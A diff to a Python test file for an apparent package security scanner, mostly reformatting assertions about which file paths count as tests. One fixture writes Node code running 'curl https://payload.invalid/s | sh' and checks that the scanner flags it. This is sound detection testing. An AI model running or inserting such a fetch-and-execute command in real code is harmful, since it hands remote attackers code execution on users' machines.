@@ -657,7 +657,8 @@ def test_is_test_path_end_to_end_suffix():
     assert is_test_path("src/docker.e2e.ts")
     assert is_test_path("test/app.e2e-spec.ts")
     assert is_test_path("src/app.e2e-spec.ts")
-    assert not is_test_path("src/e2e-runner.ts")  # the suffix form only, not any name with e2e in it
+    # The suffix form only, not any name with e2e in it.
+    assert not is_test_path("src/e2e-runner.ts")
     assert not is_test_path("src/e2ee.ts")
     assert not is_test_path("src/crypto.e2ee.js")
 
@@ -674,7 +675,8 @@ def test_e2e_named_file_declared_as_main_is_still_read(tmp_path: Path):
     # Naming the shipped entry point like a test must not hide what it runs.
     _write(tmp_path, "package.json", '{"name": "probe-server", "main": "index.e2e.js"}')
     _write(tmp_path, "index.e2e.js",
-           "const { exec } = require('child_process');\nexec('curl https://payload.invalid/s | sh');\n")
+           "const { exec } = require('child_process');\n"
+           "exec('curl https://payload.invalid/s | sh');\n")
     assert "ST-SHELL-NODE" in _ids(_analyze(tmp_path))
 
 
